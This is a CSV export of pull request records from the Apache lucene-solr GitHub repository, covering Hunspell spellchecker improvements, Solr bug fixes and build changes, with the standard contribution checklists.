"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","2314","LUCENE-9736: Hunspell: support MAP-based suggestions for groups of si…","…milar letters   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell has MAP directive that allows to specify groups of similar characters/substrings to be considered for replacement  # Solution  Replicate Hunspell's logic: try replacing all occurrences of everything in MAP groups with other members of the same groups  # Tests  `map` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-07T13:25:02Z","2021-02-08T10:13:51Z"
"","2278","SOLR-15124: Remove node/container level admin handlers from ImplicitP…","…lugins.json   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2021-02-01T10:56:01Z","2021-06-22T08:55:14Z"
"","2048","SOLR-14969: Prevent creating multiple cores with the same name which …","…leads to instabilities (race condition)  Running check now, what do people think about the approach? Running tests now, barring objections I'll push tomorrow sometime (Friday)...","closed","","ErickErickson","2020-10-30T01:05:55Z","2020-10-30T03:21:25Z"
"","2363","LUCENE-9766: Hunspell: add API for retrieving dictionary morphologica…","…l data and stemming   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We need to rank suggestions based on metadata associated with corresponding dictionary entries. For that, we need a stemming API (to get the entries) and an API to get the morphological data (where we'd store the needed info)  # Solution  Add public `Hunspell.getRoots` and `Dictionary.lookupEntries`  # Tests  Yes, a test for each new introduced method  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-12T16:21:58Z","2021-02-15T19:48:36Z"
"","2308","LUCENE-9734: Hunspell: support suggestions based on ""ph"" morphologica…","…l data   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  `ph:` data is used for suggestions in Hunspell, we need that, too  # Solution  Convert `ph:` data to `REP`  # Tests  `ph` and `ph2` from Hunspell repository, plus enable accidentally disabled `rep` test (and fix it by committing `rep.aff` in the correct encoding)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-05T09:19:00Z","2021-02-06T17:07:46Z"
"","2244","SOLR-15099 Add null checks to IndexSizeTrigger","…its are enqueued   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Want to avoid noisy NPE on core info variables since we already log.warn on line 330.  # Solution  Minor fix: add null checks on the core info variables, as we've seen on ZK restarts that these are unavailable.   # Tests  Ran IndexSizeTrigger test locally and it succeeded. Didn't add tests for this.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","megancarey","2021-01-26T00:33:11Z","2021-01-26T00:33:11Z"
"","2216","SOLR-15085 Prevent EmbeddedSolrServer calling shutdown on a CoreConta…","…iner that was passed to it   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Prevent EmbeddedSolrServer calling shutdown on a CoreContainer that was passed to it.  # Solution  Now keeping track of whether the CoreContainer was provided or created internally and only calling shutdown for internally-created instances.  # Tests  Modified appropriate test to confirm behaviour, and removed overrides used in existing tests to workaround this issue.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","timatbw","2021-01-18T12:50:06Z","2021-01-29T17:16:57Z"
"","2079","SOLR-14998 Update log level to DEBUG for ClusterStatus in Collections…","…Handler   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2020-11-13T17:45:25Z","2020-11-16T21:59:32Z"
"","1893","LUCENE-9444 Utility class to get facet labels from taxonomy for a fac…","…et field. This is useful if a facet field is requested in the list of return fields for each hit.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This pull request adds a convenience class that allows an application to get facet labels for a facet field without knowing the internals of faceting implementation.  # Solution  Simple class with APIs to get facet labels for a facet field and (optionally) a facet dimension  # Tests  Tests were added to demonstrate expected API usage and ensure correctness of implementation  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","goankur","2020-09-19T01:31:15Z","2020-09-28T14:55:38Z"
"","2636","SOLR-15892: Adding Randomization in selecting shard leaders for delete and commit requests for RoutedAlias","…e and commit requests for RoutedAlias","open","","akkig","2022-01-04T20:16:17Z","2022-01-04T20:16:17Z"
"","2309","SOLR-14301: Remove external commons-codec usage in gradle validateJarChecksums","…Checksums   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Right now gradle calculates SHA-1 checksums using an external commons-codec library. We can calculate SHA-1 using Java 8 classes, no need for commons-codec here.  # Solution  Eliminate commons-codec usage in checksum validation.  # Tests  ./gradlew validateJarChecksums  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","asalamon74","2021-02-05T11:12:21Z","2021-02-13T12:44:58Z"
"","2385","SOLR-15135: Use DocCollection to generate state.json format expected …","…by UI to work with perReplicaState collections (backport to 8_8)   See: https://github.com/apache/lucene-solr/pull/2384","closed","","thelabdude","2021-02-16T21:29:47Z","2021-02-16T21:40:17Z"
"","1808","LUCENE-9492: Fix beasting to accept also task names in form "":project…","…:beast""; fix bug with default value rejected by Integer.parseInt","closed","","uschindler","2020-08-31T15:54:47Z","2020-08-31T18:21:53Z"
"","2305","LUCENE-9733: Hunspell: exception when loading dictionaries with mixed…","…-case words and aliased flags   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Alias treatment expects the flag string to be a single number, but HIDDEN flag is prepended to that string according to the flag format.  # Solution  Serialize the HIDDEN flag always as is, and when reading, consume it manually right after FLAG_SEPARATOR.  # Tests  Expanded `compressed.aff/dic`, added stemming checks. Removed now obsolete test for format-dependent flag serialization, as it's no longer needed.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-04T17:10:12Z","2021-02-05T08:56:04Z"
"","2354","LUCENE-9765: Hunspell: rename SpellChecker to Hunspell, fix test name…","…, update javadoc and CHANGES.txt   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The class names are imperfect and the docs are outdated  # Solution  Fix that  # Tests  No behavior change.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-11T17:30:37Z","2021-02-12T16:27:14Z"
"","2348","LUCENE-9761: Hunspell: check that FLAG and SET don't occur too far in…","… the file, cleanup   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The parser expects SET and FLAG to occur in the first 30KB of the file, let's have an assertion for that  # Solution  Fail if encountering directives that contradict previously seen ones.  # Tests  None  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-10T16:46:07Z","2021-02-11T08:28:50Z"
"","2295","LUCENE-9726: Hunspell: speed up spellchecking by stopping at a single…","… found stem   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  `Stemmer.doStem` enumerates all possibilities, while in the spellchecker we only care if there are any roots found.  # Solution  Introduce a `RootProcessor` interface returning a boolean indicating whether to continue the search.  # Tests  No new functionality, no tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-03T09:19:04Z","2021-02-05T08:55:22Z"
"","2369","LUCENE-9771: Hunspell: don't lookup word roots unnecessarily to check…","… flags   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell performs unnecessary root lookups from the times before `Root` class was introduced  # Solution  Cleanup and shorten code by using `Root.entryId` instead of guessing flags by `lookupWord`  # Tests  None, just a cleanup.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T10:10:52Z","2021-02-15T19:27:45Z"
"","2283","LUCENE-9719: Resource files aren't deleted from build directory after…","… being deleted in source   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  e.g. *.sug files used in Hunspell  # Solution  Make Gradle `Sync` them instead of `Copy`  # Tests  No  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-01T17:02:14Z","2021-02-05T08:54:43Z"
